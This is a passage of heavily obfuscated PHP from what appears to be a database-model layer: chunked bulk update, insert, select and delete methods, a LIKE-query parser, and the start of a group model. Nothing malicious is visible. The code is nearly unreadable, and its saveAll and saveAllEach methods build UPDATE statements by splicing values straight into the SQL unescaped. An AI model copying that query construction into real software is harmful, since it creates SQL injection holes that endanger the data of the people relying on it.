$A®à¹®Ø—[33]) { unset($e“Í™‚¸…™[$aÁ£İ¯ç‹]); } break; case $A®à¹®Ø—[321]: $e“Í™‚¸…™[$aÁ£İ¯ç‹] = $eÂËË§·[1]; default: break; } } } public function saveAll($AÆ¼âõƒ) { goto bâøĞÃ£í’; cš’º˜›îì: $BéßùÊÕ”Ò = array(); $a–Îİ¦²£ = count($AÆ¼âõƒ); for ($FÊäÛ¶§©Ÿ = 0; $FÊäÛ¶§©Ÿ < $a–Îİ¦²£; $FÊäÛ¶§©Ÿ++) { $Aª£²÷ÈÍÈ = $AÆ¼âõƒ[$FÊäÛ¶§©Ÿ]; if (!is_array($Aª£²÷ÈÍÈ) || count($Aª£²÷ÈÍÈ) != 4) { continue; } $Cäò‚Î¬ì = "\x55\x50\104\101\124\x45\40\140{$AÉ¡›ÏïŞ}\140\40\123\x45\x54\40{$Aª£²÷ÈÍÈ[2]}\40\x3d\x20\x43\101\x53\x45\x20{$Aª£²÷ÈÍÈ[0]}\40\12"; if ($Fƒ¤éĞÒÀ… == 0) { $Aâ˜Â‰ÅêÛ = $Cäò‚Î¬ì; } $BéßùÊÕ”Ò[] = $CªğÔœ…í[116] . $Aª£²÷ÈÍÈ[1] . $CªğÔœ…í[116]; $Fƒ¤éĞÒÀ…++; $Aâ˜Â‰ÅêÛ .= "\40\127\110\105\116\40\x27{$Aª£²÷ÈÍÈ[1]}\x27\40\124\110\x45\x4e\x20\47{$Aª£²÷ÈÍÈ[3]}\x27\x20\12"; if ($Fƒ¤éĞÒÀ… == $DÀ»ÛÛáÙÔ || $FÊäÛ¶§©Ÿ == $a–Îİ¦²£ - 1) { goto b²ØÄ–§‡; BÈ†ã¬±£ñ: $Fƒ¤éĞÒÀ… = 0; $Aâ˜Â‰ÅêÛ = $Cäò‚Î¬ì; $this->chunkEventCheck(count($BéßùÊÕ”Ò)); goto dùğ’½øù×; dùğ’½øù×: $BéßùÊÕ”Ò = array(); goto c³Œ¿›ˆ–ß; b²ØÄ–§‡: $AôŸÍ†¿§£ = implode($CªğÔœ…í[47], $BéßùÊÕ”Ò); $Aâ˜Â‰ÅêÛ .= "\x20\105\116\x44\x20\40\x57\x48\x45\122\x45\x20{$Aª£²÷ÈÍÈ[0]}\40\111\116\x20\x28{$AôŸÍ†¿§£}\51\x20"; $this->execute($Aâ˜Â‰ÅêÛ); goto BÈ†ã¬±£ñ; c³Œ¿›ˆ–ß: } } goto fó¼Â÷›ØÉ; eæ©ª•Ñ«µ: $AÆ¼âõƒ = is_array($AÆ¼âõƒ) ? $AÆ¼âõƒ : array(); $Aâ˜Â‰ÅêÛ = $CªğÔœ…í[374]; $Fƒ¤éĞÒÀ… = 0; goto cš’º˜›îì; bâøĞÃ£í’: $CªğÔœ…í =& $_SERVER[Šº]; $AÉ¡›ÏïŞ = $this->tablePrefix . $this->tableName; $DÀ»ÛÛáÙÔ = self::SQL_WHERE_IN_CHUNK; goto eæ©ª•Ñ«µ; fó¼Â÷›ØÉ: $this->chunkEventSet(); goto A·™£„‡æ; A·™£„‡æ: } public function saveAllEach($Dæí¤øØÀ) { $fçŸ²«É‡ê =& $_SERVER[Šº]; $C¯µ…­åäÜ = $this->tablePrefix . $this->tableName; foreach ($Dæí¤øØÀ as $bÃÍ¼È²¨Ë) { if (!is_array($bÃÍ¼È²¨Ë) || count($bÃÍ¼È²¨Ë) != 4) { continue; } $D³ïÃÂ¥øò = $bÃÍ¼È²¨Ë[0] . $fçŸ²«É‡ê[375] . $bÃÍ¼È²¨Ë[1] . $fçŸ²«É‡ê[116]; $d–Š‘¢‰õ½ = $bÃÍ¼È²¨Ë[2] . $fçŸ²«É‡ê[375] . $bÃÍ¼È²¨Ë[3] . $fçŸ²«É‡ê[116]; $fÇĞÃ½†Î = "\x75\x70\144\141\164\x65\40{$C¯µ…­åäÜ}\x20\163\x65\x74\x20{$d–Š‘¢‰õ½}\40\x77\150\145\162\x65\40{$D³ïÃÂ¥øò}\x3b"; $this->execute($fÇĞÃ½†Î); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Cíìàßø‚ª = false, $bŞ“ÍÃÄÄí = false) { $this->_chunkEvent = $Cíìàßø‚ª; $this->_chunkEventParam = $bŞ“ÍÃÄÄí; } private function chunkEventCheck($C˜ï‚Ğ‰ï®) { if (!$this->_chunkEvent) { return; } $e‡Ë¥™ì¬» = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $e‡Ë¥™ì¬»[$_SERVER[Šº][376]] = $C˜ï‚Ğ‰ï®; Hook::trigger($this->_chunkEvent, $e‡Ë¥™ì¬»); } public function addAll($E»¢ä¢ˆÑˆ, $dÍò£Ø’Á = array(), $A¸—ŒËšŞå = false) { goto aòÜîù¨ÌÀ; C£¡ªâÆ‹: if (empty($E»¢ä¢ˆÑˆ)) { $this->error = think_lang($E‡Şˆ£‹˜[268]); return !1; } $dÍò£Ø’Á = $this->_parseOptions($dÍò£Ø’Á); foreach ($E»¢ä¢ˆÑˆ as $cÛ»¿®—ˆĞ => $E±ìã‚Ñˆ‚) { $E»¢ä¢ˆÑˆ[$cÛ»¿®—ˆĞ] = $this->_facade($E±ìã‚Ñˆ‚); $this->_beforeInsert($E»¢ä¢ˆÑˆ[$cÛ»¿®—ˆĞ], $dÍò£Ø’Á); } goto e§Ğï¸¨¬ª; aòÜîù¨ÌÀ: $E‡Şˆ£‹˜ =& $_SERVER[Šº]; ignore_timeout(); $e»óî¬Ø¾É = self::SQL_WHERE_IN_CHUNK; goto C£¡ªâÆ‹; e§Ğï¸¨¬ª: if (method_exists($this->db, $E‡Şˆ£‹˜[269])) { for ($CŸ”µÆØ‡  = 0; $CŸ”µÆØ‡  < count($E»¢ä¢ˆÑˆ); $CŸ”µÆØ‡  += $e»óî¬Ø¾É) { $Fµ©³Ê×‡ = array_slice($E»¢ä¢ˆÑˆ, $CŸ”µÆØ‡ , $e»óî¬Ø¾É); if (!is_array($Fµ©³Ê×‡) || count($Fµ©³Ê×‡) == 0) { break; } $c±ª·„¡ = $this->db->insertAll($Fµ©³Ê×‡, $dÍò£Ø’Á, $A¸—ŒËšŞå); $this->chunkEventCheck(count($Fµ©³Ê×‡)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($E»¢ä¢ˆÑˆ as $cÛ»¿®—ˆĞ => $E±ìã‚Ñˆ‚) { $c±ª·„¡ = $this->db->insert($E±ìã‚Ñˆ‚, $dÍò£Ø’Á, $A¸—ŒËšŞå); } $this->commit(); } if (!1 !== $c±ª·„¡) { $a¢”‘ĞË©Ó = $this->getLastInsID(); if ($a¢”‘ĞË©Ó) { return $a¢”‘ĞË©Ó; } } return $c±ª·„¡; goto B‘‡èß„„Œ; B‘‡èß„„Œ: } public function save($b´äÎ‚ÌÔ  = '', $fßÌĞªƒæ = array()) { goto eÀàÏÁ»ïé; dÜåÉ†©´: $CÁ´Ç‰¨ãã = $this->findWhereField($fÀØ»È¼Šì); if (!$CÁ´Ç‰¨ãã) { return parent::save($b´äÎ‚ÌÔ , $fßÌĞªƒæ); } $D°çøÍÄÑğ = 0; goto E¡ìÄôàîÁ; eÀàÏÁ»ïé: $cÆ‰ô†ÜÉè =& $_SERVER[Šº]; $C¹èè½è÷  = self::SQL_WHERE_IN_CHUNK; $fÀØ»È¼Šì = $this->optionsValue(); goto dÜåÉ†©´; d°¼ãšµøÇ: for ($EƒÆœóçã = 0; $EƒÆœóçã < $e¨¡‘œ÷®À; $EƒÆœóçã += $C¹èè½è÷ ) { $BÕğ¹›øŸš = array_slice($bèÂ³¢™¾, $EƒÆœóçã, $C¹èè½è÷ ); if (!is_array($BÕğ¹›øŸš) || count($BÕğ¹›øŸš) == 0) { break; } $fÀØ»È¼Šì[$cÆ‰ô†ÜÉè[272]][$CÁ´Ç‰¨ãã][1] = $BÕğ¹›øŸš; $this->optionsValue($fÀØ»È¼Šì); $D°çøÍÄÑğ += parent::save($b´äÎ‚ÌÔ , $fßÌĞªƒæ); $this->chunkEventCheck(count($BÕğ¹›øŸš)); } $this->chunkEventSet(); return $D°çøÍÄÑğ; goto F¿ö½Àˆ•×; E¡ìÄôàîÁ: $bèÂ³¢™¾ = $fÀØ»È¼Šì[$cÆ‰ô†ÜÉè[272]][$CÁ´Ç‰¨ãã][1]; $bèÂ³¢™¾ = is_array($bèÂ³¢™¾) ? $bèÂ³¢™¾ : array(); $e¨¡‘œ÷®À = count($bèÂ³¢™¾); goto d°¼ãšµøÇ; F¿ö½Àˆ•×: } public function add($d¤ÄÌ…‹Šî = '', $dÇËİØ†İ‡ = array(), $f™íğ‘ÎªÍ = false) { if ($this->addTaskStatus && is_array($d¤ÄÌ…‹Šî)) { $this->addTaskData[] = $d¤ÄÌ…‹Šî; return; } return parent::add($d¤ÄÌ…‹Šî, $dÇËİØ†İ‡, $f™íğ‘ÎªÍ); } public function parseWhereLike($Dæ‹—…Õò, $b†ÍØ‚â§´ = '', $EíËéÕõá = false, &$b÷İƒ±İ÷… = false) { goto eƒ«öÛøÉ; eƒ«öÛøÉ: $e®Ğ™õß¹ =& $_SERVER[Šº]; $c‘×ËÑ‡§— = $GLOBALS[$e®Ğ™õß¹[6]][$e®Ğ™õß¹[377]]; if (!$c‘×ËÑ‡§—[$e®Ğ™õß¹[378]]) { return $Dæ‹—…Õò; } goto BÜÆÍŠ­Ô‡; BÜÆÍŠ­Ô‡: if (!is_array($Dæ‹—…Õò)) { return $Dæ‹—…Õò; } $CÉ°óÍÊÚğ = array(); $d­›°¼äÈ = 0; goto ašÍ¨š­Ÿº; ašÍ¨š­Ÿº: foreach ($Dæ‹—…Õò as $D½¨‰éÕ¥Â => $a„Îß©) { if (is_array($a„Îß©) && count($a„Îß©) == 2 && $a„Îß©[0] == $e®Ğ™õß¹[379] && is_string($a„Îß©[1]) && substr($a„Îß©[1], 0, 1) == $e®Ğ™õß¹[380] && substr($a„Îß©[1], strlen($a„Îß©[1]) - 1, 1) == $e®Ğ™õß¹[380]) { goto A´É×»Ğ‹õ; A´É×»Ğ‹õ: $b÷İƒ±İ÷… = !0; $c·ùß‹¶¥´ = is_string($D½¨‰éÕ¥Â) ? $D½¨‰éÕ¥Â : $b†ÍØ‚â§´; $E£šˆë½“Ô = substr($a„Îß©[1], 1, strlen($a„Îß©[1]) - 2); goto fáİ äë; B¹ÕØ²Ú„: continue; goto F­™î‰®¼æ; fáİ äë: $E£šˆë½“Ô = $this->db->escapeString($E£šˆë½“Ô); if (!strpos($c·ùß‹¶¥´, $e®Ğ™õß¹[95])) { $c·ùß‹¶¥´ = $e®Ğ™õß¹[381] . $c·ùß‹¶¥´ . $e®Ğ™õß¹[381]; } $f¼‰ô¯Â¹™ = $e®Ğ™õß¹[182] . $E£šˆë½“Ô . $e®Ğ™õß¹[182]; goto f™ˆî¸ŸÑÅ; f™ˆî¸ŸÑÅ: if ($c‘×ËÑ‡§—[$e®Ğ™õß¹[382]]) { $f¼‰ô¯Â¹™ = $e®Ğ™õß¹[383] . $E£šˆë½“Ô . $e®Ğ™õß¹[384]; if ($c‘×ËÑ‡§—[$e®Ğ™õß¹[385]]) { $f¼‰ô¯Â¹™ = $e®Ğ™õß¹[384] . $E£šˆë½“Ô . $e®Ğ™õß¹[383]; } } $CÉ°óÍÊÚğ[$d­›°¼äÈ] = $e®Ğ™õß¹[386] . $c·ùß‹¶¥´ . $e®Ğ™õß¹[387] . $f¼‰ô¯Â¹™ . $e®Ğ™õß¹[388]; $d­›°¼äÈ++; goto B¹ÕØ²Ú„; F­™î‰®¼æ: } if (is_array($a„Îß©)) { $b†ÍØ‚â§´ = is_string($D½¨‰éÕ¥Â) ? $D½¨‰éÕ¥Â : $b†ÍØ‚â§´; $a„Îß© = $this->parseWhereLike($a„Îß©, $b†ÍØ‚â§´, !0, $b÷İƒ±İ÷…); } if (is_numeric($D½¨‰éÕ¥Â)) { $CÉ°óÍÊÚğ[$d­›°¼äÈ] = $a„Îß©; $d­›°¼äÈ++; } else { $CÉ°óÍÊÚğ[$D½¨‰éÕ¥Â] = $a„Îß©; } } if ($b÷İƒ±İ÷… && !$EíËéÕõá) { } return $CÉ°óÍÊÚğ; goto DÆ§…÷½Ö‚; DÆ§…÷½Ö‚: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($AÊÆ²Ä„ó = array()) { goto cµ•÷È‘ôÂ; f½…¹Û»´™: return $CË²´½ÜÀ÷; goto D˜Ä±›†‡İ; cµ•÷È‘ôÂ: $b³ŒÕÖŸ°ä =& $_SERVER[Šº]; $AÀœ†¾Ö‘‘ = self::SQL_WHERE_IN_CHUNK; $c£óí¹  ª = $this->optionsValue(); goto c°´éÌÚÎ„; c°´éÌÚÎ„: $fÒ¼ğ‚Ü’ = $this->findWhereField($c£óí¹  ª); if (!$fÒ¼ğ‚Ü’ || isset($c£óí¹  ª[$b³ŒÕÖŸ°ä[289]]) || isset($c£óí¹  ª[$b³ŒÕÖŸ°ä[350]])) { return parent::select($AÊÆ²Ä„ó); } $E¹Âæ‘øÑ… = $c£óí¹  ª[$b³ŒÕÖŸ°ä[272]][$fÒ¼ğ‚Ü’][1]; goto fƒ¶´·ö†ğ; fƒ¶´·ö†ğ: $E¹Âæ‘øÑ… = is_array($E¹Âæ‘øÑ…) ? $E¹Âæ‘øÑ… : array(); $CË²´½ÜÀ÷ = null; for ($CÖÃ´ Ìß¸ = 0; $CÖÃ´ Ìß¸ < count($E¹Âæ‘øÑ…); $CÖÃ´ Ìß¸ += $AÀœ†¾Ö‘‘) { $cÜÁ½÷‡ìÖ = array_slice($E¹Âæ‘øÑ…, $CÖÃ´ Ìß¸, $AÀœ†¾Ö‘‘); if (!is_array($cÜÁ½÷‡ìÖ) || count($cÜÁ½÷‡ìÖ) == 0) { break; } $c£óí¹  ª[$b³ŒÕÖŸ°ä[272]][$fÒ¼ğ‚Ü’][1] = $cÜÁ½÷‡ìÖ; $this->optionsValue($c£óí¹  ª); $aÇÒÔ‡µ· = parent::select($AÊÆ²Ä„ó); if (!$aÇÒÔ‡µ·) { continue; } $CË²´½ÜÀ÷ = is_array($CË²´½ÜÀ÷) ? $CË²´½ÜÀ÷ : array(); $CË²´½ÜÀ÷ = array_merge($CË²´½ÜÀ÷, $aÇÒÔ‡µ·); } goto f½…¹Û»´™; D˜Ä±›†‡İ: } public function delete($C¤ÄÇ…£Ÿ÷ = array()) { goto bª…Úªƒ¯ñ; f±ƒ¹³¢‡Ü: $b¾îå²„ğŒ = $this->findWhereField($cß†Ê…Ë¶¼); if (!$b¾îå²„ğŒ) { return parent::delete($C¤ÄÇ…£Ÿ÷); } $Bë®İŒ¸™ = 0; goto BÖ¡‰—Ç; BÖ¡‰—Ç: $càïŸ¸ƒÊƒ = $cß†Ê…Ë¶¼[$Dƒ»ÄĞÂ[272]][$b¾îå²„ğŒ][1]; $càïŸ¸ƒÊƒ = is_array($càïŸ¸ƒÊƒ) ? $càïŸ¸ƒÊƒ : array(); for ($BÜ®Ã Ê‰ = 0; $BÜ®Ã Ê‰ < count($càïŸ¸ƒÊƒ); $BÜ®Ã Ê‰ += $A²‹ƒ©Ï»¶) { $F‘¥ãª¬İ® = array_slice($càïŸ¸ƒÊƒ, $BÜ®Ã Ê‰, $A²‹ƒ©Ï»¶); if (!is_array($F‘¥ãª¬İ®) || count($F‘¥ãª¬İ®) == 0) { break; } $cß†Ê…Ë¶¼[$Dƒ»ÄĞÂ[272]][$b¾îå²„ğŒ][1] = $F‘¥ãª¬İ®; $this->optionsValue($cß†Ê…Ë¶¼); $Bë®İŒ¸™ += parent::delete($C¤ÄÇ…£Ÿ÷); } goto BÚ‹ßğ»ÌÍ; BÚ‹ßğ»ÌÍ: return $Bë®İŒ¸™; goto CìÏÙ«‹É²; bª…Úªƒ¯ñ: $Dƒ»ÄĞÂ =& $_SERVER[Šº]; $A²‹ƒ©Ï»¶ = self::SQL_WHERE_IN_CHUNK; $cß†Ê…Ë¶¼ = $this->optionsValue(); goto f±ƒ¹³¢‡Ü; CìÏÙ«‹É²: } private function findWhereField($b—Ì‚¦¾Ê÷) { $bæÀëô¾ÑÏ =& $_SERVER[Šº]; $c³¸‰îºÒ = self::SQL_WHERE_IN_CHUNK; if (!is_array($b—Ì‚¦¾Ê÷) || !is_array($b—Ì‚¦¾Ê÷[$bæÀëô¾ÑÏ[272]])) { return !1; } foreach ($b—Ì‚¦¾Ê÷[$bæÀëô¾ÑÏ[272]] as $f„ö±—ßó÷ => $c²ÆÜ“è®) { if (is_array($c²ÆÜ“è®) && isset($c²ÆÜ“è®[0]) && is_string($c²ÆÜ“è®[0]) && strtolower($c²ÆÜ“è®[0]) == $bæÀëô¾ÑÏ[7] && is_array($c²ÆÜ“è®[1]) && count($c²ÆÜ“è®[1]) > $c³¸‰îºÒ) { ignore_timeout(); return $f„ö±—ßó÷; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\x65\155\117\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($eÚ¸ªÍÔÌâ = false, $E«Š…İˆ½ = "\x6d\157\x64\x69\x66\171\124\x69\x6d\x65", $cŞ›µÉÍÈ = false) { $aº¿Ê‘óá˜ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$aº¿Ê‘óá˜) { return $eÚ¸ªÍÔÌâ ? null : array(); } if (!$eÚ¸ªÍÔÌâ) { $aº¿Ê‘óá˜ = array_filter(array_values($aº¿Ê‘óá˜)); return array_sort_by($aº¿Ê‘óá˜, $E«Š…İˆ½, $cŞ›µÉÍÈ); } return $aº¿Ê‘óá˜[$_SERVER[Šº][389] . $eÚ¸ªÍÔÌâ]; } public function insert($DÛ–­¯çÅ‚) { goto bÄ¶„ñ›Ù; bÄ¶„ñ›Ù: $f½”Ö‘×– =& $_SERVER[Šº]; $DÛ–­¯çÅ‚ = array_field_key($DÛ–­¯çÅ‚, $this->field); $bø¥Œ¡™Ò = Model($this->modelType)->get($f½”Ö‘×–[390], $this->optionType . $f½”Ö‘×–[391]); goto eïÁŠ•Ù¯À; eïÁŠ•Ù¯À: $bø¥Œ¡™Ò = $bø¥Œ¡™Ò ? $bø¥Œ¡™Ò : 0; $DÛ–­¯çÅ‚[$f½”Ö‘×–[392]] = ++$bø¥Œ¡™Ò; $DÛ–­¯çÅ‚[$f½”Ö‘×–[193]] = time(); goto b°ìŠ®µä‡; F‰ÖìŒ”»¡: return $bø¥Œ¡™Ò; goto EÎ§ˆ„¿ñ; b°ìŠ®µä‡: $DÛ–­¯çÅ‚[$f½”Ö‘×–[84]] = time(); Model($this->modelType)->set($f½”Ö‘×–[390], $bø¥Œ¡™Ò, $this->optionType . $f½”Ö‘×–[391]); Model($this->modelType)->set($f½”Ö‘×–[389] . $bø¥Œ¡™Ò, $DÛ–­¯çÅ‚, $this->optionType); goto F‰ÖìŒ”»¡; EÎ§ˆ„¿ñ: } public function update($F†ê®…¶´æ, $EÀƒ·ëùØ¼) { goto C’øßØ¶†‰; C’øßØ¶†‰: $c¡Ş‘•Ö¨º =& $_SERVER[Šº]; $EÀƒ·ëùØ¼ = array_field_key($EÀƒ·ëùØ¼, $this->field); $A¯“¦ñ»óŞ = $this->listData($F†ê®…¶´æ); goto BÍÖ¿ÖäõÇ; BÍÖ¿ÖäõÇ: if (!$A¯“¦ñ»óŞ) { return !1; } $EÀƒ·ëùØ¼ = array_merge($A¯“¦ñ»óŞ, $EÀƒ·ëùØ¼); $EÀƒ·ëùØ¼[$c¡Ş‘•Ö¨º[84]] = time(); goto D‰ÇòÈ¹Îò; D‰ÇòÈ¹Îò: return Model($this->modelType)->set($c¡Ş‘•Ö¨º[389] . $F†ê®…¶´æ, $EÀƒ·ëùØ¼, $this->optionType); goto aŒ´Š°ÖÖÙ; aŒ´Š°ÖÖÙ: } public function remove($bŸè«“Š÷) { return Model($this->modelType)->remove($_SERVER[Šº][389] . $bŸè«“Š÷, $this->optionType); } public function clear() { $bÅñ« ’ï =& $_SERVER[Šº]; Model($this->modelType)->remove($bÅñ« ’ï[390], $this->optionType . $bÅñ« ’ï[391]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($aÑÃ˜øà, $føßà„ËÂÛ) { if (!$føßà„ËÂÛ) { return !1; } $f™ÀÔÎ³ÎÁ = $this->listData(); $f™ÀÔÎ³ÎÁ = array_to_keyvalue($f™ÀÔÎ³ÎÁ, $aÑÃ˜øà); return isset($f™ÀÔÎ³ÎÁ[$føßà„ËÂÛ]) ? $f™ÀÔÎ³ÎÁ[$føßà„ËÂÛ] : !1; } public function findByName($AÕ˜Ì·Ò¨İ) { return $this->findByKey($_SERVER[Šº][28], $AÕ˜Ì·Ò¨İ); } protected function resetData($cõ¹‰ÌÓÙÕ) { $dº±øë«’ =& $_SERVER[Šº]; $cõ¹‰ÌÓÙÕ = is_array($cõ¹‰ÌÓÙÕ) ? $cõ¹‰ÌÓÙÕ : array(); $dÕŒŒ¬“ÅĞ = array(); for ($aµê¼÷¦ç… = 0; $aµê¼÷¦ç… < count($cõ¹‰ÌÓÙÕ); $aµê¼÷¦ç…++) { $dÕŒŒ¬“ÅĞ[$dº±øë«’[389] . $cõ¹‰ÌÓÙÕ[$aµê¼÷¦ç…][$dº±øë«’[392]]] = $cõ¹‰ÌÓÙÕ[$aµê¼÷¦ç…]; } return Model($this->modelType)->set($dÕŒŒ¬“ÅĞ, !1, $this->optionType); } private function getAutoName($a¯÷é¦Ô¹) { $C¸àÎ…Ş„— = array_to_keyvalue($this->listData(), $_SERVER[Šº][28]); if (!$C¸àÎ…Ş„— || !isset($C¸àÎ…Ş„—[$a¯÷é¦Ô¹])) { return $a¯÷é¦Ô¹; } for ($aÖóé¯®·È = 1; $aÖóé¯®·È < count($C¸àÎ…Ş„—); $aÖóé¯®·È++) { $E¨ñ©–ó´¯ = $a¯÷é¦Ô¹ . "\x28{$aÖóé¯®·È}\51"; if (!isset($C¸àÎ…Ş„—[$E¨ñ©–ó´¯])) { return $E¨ñ©–ó´¯; } } return $E¨ñ©–ó´¯; } } $B£ñ»ëçÍ = $_SERVER[$_SERVER[Šº][393]]; goto bƒŸî¹ºƒ; a¤¤±¿Ìœ¸: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\160"; protected $tableMeta = array("\x74\x61\x62\154\145\116\141\x6d\x65" => "\147\x72\x6f\x75\160\x5f\x6d\145\x74\141", "\155\145\164\141\x46\x69\145\154\144" => "\147\x72\x6f\165\160\x49\104"); protected function cacheFunctionAlias($e¦øµÇƒ¥Š) { $Aí‘±ÀÀñ‘ =& $_SERVER[Šº]; return array($Aí‘±ÀÀñ‘[1747] => array($e¦øµÇƒ¥Š[0], $Aí‘±ÀÀñ‘[1748]), $Aí‘±ÀÀñ‘[1749] => array($e¦øµÇƒ¥Š[0], $Aí‘±ÀÀñ‘[1748])); } protected function getInfo($fÈˆõÖ­ç) { $eéÛ¨Ë—¥Å = $this->getInfoSimple($fÈˆõÖ­ç); if (!$eéÛ¨Ë—¥Å) { return !1; } return $this->_listDataApplyItem($eéÛ¨Ë—¥Å); } protected function getInfoSimple($CÛÌ˜Ø„„, $fíåï´ÁÌ³ = false) { $bìœ’˜£ßÆ =& $_SERVER[Šº]; if ($fíåï´ÁÌ³) { $BÛ²Ôè˜Ğ = array($bìœ’˜£ßÆ[1677] => intval($CÛÌ˜Ø„„)); $Bˆ¥±ÖÖê = $this->where($BÛ²Ôè˜Ğ)->find(); return is_array($Bˆ¥±ÖÖê) ? $Bˆ¥±ÖÖê : array(); } return $this->cacheFunctionGet($bìœ’˜£ßÆ[1750], $CÛÌ˜Ø„„); } protected function groupAdd($aÖ¥ó£øáò) { goto aÎö¥çÔ; AæõŠøˆÅ²: if (isset($aÖ¥ó£øáò[$DôÔµæÏ÷‡[1753]])) { $this->metaSet($BÍÛÓÅäç„, array($DôÔµæÏ÷‡[1753] => $aÖ¥ó£øáò[$DôÔµæÏ÷‡[1753]], $DôÔµæÏ÷‡[1754] => $aÖ¥ó£øáò[$DôÔµæÏ÷‡[1754]])); unset($aÖ¥ó£øáò[$DôÔµæÏ÷‡[1753]]); unset($aÖ¥ó£øáò[$DôÔµæÏ÷‡[1754]]); } Model($DôÔµæÏ÷‡[1192])->groupRootAdd($BÍÛÓÅäç„); return $BÍÛÓÅäç„; goto FÆ£µÃ‡; cæƒÆĞ–: if (!empty($aÖ¥ó£øáò[$DôÔµæÏ÷‡[1677]])) { $A§º±Ë¬í[$DôÔµæÏ÷‡[1677]] = $aÖ¥ó£øáò[$DôÔµæÏ÷‡[1677]]; } $BÍÛÓÅäç„ = $this->add($A§º±Ë¬í); $this->setNamePinyin($BÍÛÓÅäç„, $A§º±Ë¬í[$DôÔµæÏ÷‡[28]]); goto AæõŠøˆÅ²; E¦Ï‡ÙÔãñ: if ($DëÔ‡ñµ³ù[$DôÔµæÏ÷‡[494]]) { $E‡Œ‚ëëßÎ = $DëÔ‡ñµ³ù[$DôÔµæÏ÷‡[494]] . $DëÔ‡ñµ³ù[$DôÔµæÏ÷‡[1677]] . $DôÔµæÏ÷‡[47]; } $A§º±Ë¬í = array($DôÔµæÏ÷‡[420] => $this->groupNameAuto($aÖ¥ó£øáò[$DôÔµæÏ÷‡[485]], $aÖ¥ó£øáò[$DôÔµæÏ÷‡[28]]), $DôÔµæÏ÷‡[402] => $aÖ¥ó£øáò[$DôÔµæÏ÷‡[485]], $DôÔµæÏ÷‡[561] => $E‡Œ‚ëëßÎ, $DôÔµæÏ÷‡[1751] => $aÖ¥ó£øáò[$DôÔµæÏ÷‡[1661]], $DôÔµæÏ÷‡[1752] => 0, $DôÔµæÏ÷‡[1681] => 0); if (isset($aÖ¥ó£øáò[$DôÔµæÏ÷‡[1700]])) { $A§º±Ë¬í[$DôÔµæÏ÷‡[1700]] = $aÖ¥ó£øáò[$DôÔµæÏ÷‡[1700]]; } else { $BİÈÄ›´¿ˆ = $this->max($DôÔµæÏ÷‡[1700]); if (!$BİÈÄ›´¿ˆ) { $BİÈÄ›´¿ˆ = 0; } $A§º±Ë¬í[$DôÔµæÏ÷‡[1700]] = $BİÈÄ›´¿ˆ + 1; } goto cæƒÆĞ–; aÎö¥çÔ: $DôÔµæÏ÷‡ =& $_SERVER[Šº]; if (!$aÖ¥ó£øáò[$DôÔµæÏ÷‡[485]] && isset($aÖ¥ó£øáò[$DôÔµæÏ÷‡[1677]]) && $aÖ¥ó£øáò[$DôÔµæÏ÷‡[1677]] == 1) { if ($DëÔ‡ñµ³ù = $this->getInfoSimple($aÖ¥ó£øáò[$DôÔµæÏ÷‡[1677]], !0)) { return $aÖ¥ó£øáò[$DôÔµæÏ÷‡[1677]]; } } else { $DëÔ‡ñµ³ù = $this->getInfoSimple($aÖ¥ó£øáò[$DôÔµæÏ÷‡[485]]); if (!$DëÔ‡ñµ³ù) { return !1; } } $E‡Œ‚ëëßÎ = $DôÔµæÏ÷‡[506]; goto E¦Ï‡ÙÔãñ; FÆ£µÃ‡: } protected function groupEdit($E¦Ó×¯ô…µ, $c·‚ŠõÎ”) { goto D…ÔƒÉœª; CéŠï¾Œ: if (!empty($c·‚ŠõÎ”[$e«®¬ƒÄ¯»[485]])) { $d«š«ÓÙÕ° = $this->getInfoSimple($c·‚ŠõÎ”[$e«®¬ƒÄ¯»[485]]); if (!$d«š«ÓÙÕ°) { return !1; } if ($F¨ñ›·£¤‰[$e«®¬ƒÄ¯»[1677]] == $d«š«ÓÙÕ°[$e«®¬ƒÄ¯»[1677]]) { return !1; } if ($c·‚ŠõÎ”[$e«®¬ƒÄ¯»[485]] != $F¨ñ›·£¤‰[$e«®¬ƒÄ¯»[485]]) { if ($d«š«ÓÙÕ°[$e«®¬ƒÄ¯»[494]] !== $F¨ñ›·£¤‰[$e«®¬ƒÄ¯»[494]] && strpos($d«š«ÓÙÕ°[$e«®¬ƒÄ¯»[494]], $F¨ñ›·£¤‰[$e«®¬ƒÄ¯»[494]] . $F¨ñ›·£¤‰[$e«®¬ƒÄ¯»[1677]] . $e«®¬ƒÄ¯»[47]) === 0) { return !1; } $c·‚ŠõÎ”[$e«®¬ƒÄ¯»[561]] = $d«š«ÓÙÕ°[$e«®¬ƒÄ¯»[494]] . $c·‚ŠõÎ”[$e«®¬ƒÄ¯»[485]] . $e«®¬ƒÄ¯»[47]; $this->_changeChildLevel($F¨ñ›·£¤‰, $d«š«ÓÙÕ°); } } if (isset($c·‚ŠõÎ”[$e«®¬ƒÄ¯»[28]])) { $this->setNamePinyin($E¦Ó×¯ô…µ, $c·‚ŠõÎ”[$e«®¬ƒÄ¯»[28]]); } if (isset($c·‚ŠõÎ”[$e«®¬ƒÄ¯»[1753]])) { $this->metaSet($E¦Ó×¯ô…µ, array($e«®¬ƒÄ¯»[1753] => $c·‚ŠõÎ”[$e«®¬ƒÄ¯»[1753]], $e«®¬ƒÄ¯»[1754] => $c·‚ŠõÎ”[$e«®¬ƒÄ¯»[1754]])); unset($c·‚ŠõÎ”[$e«®¬ƒÄ¯»[1753]]); unset($c·‚ŠõÎ”[$e«®¬ƒÄ¯»[1754]]); } goto b‚Òë÷ŸÊ™; D…ÔƒÉœª: $e«®¬ƒÄ¯» =& $_SERVER[Šº]; $F¨ñ›·£¤‰ = $this->getInfoSimple($E¦Ó×¯ô…µ); if (!$F¨ñ›·£¤‰) { return !1; } goto CéŠï¾Œ; b‚Òë÷ŸÊ™: if (isset($c·‚ŠõÎ”[$e«®¬ƒÄ¯»[28]]) && 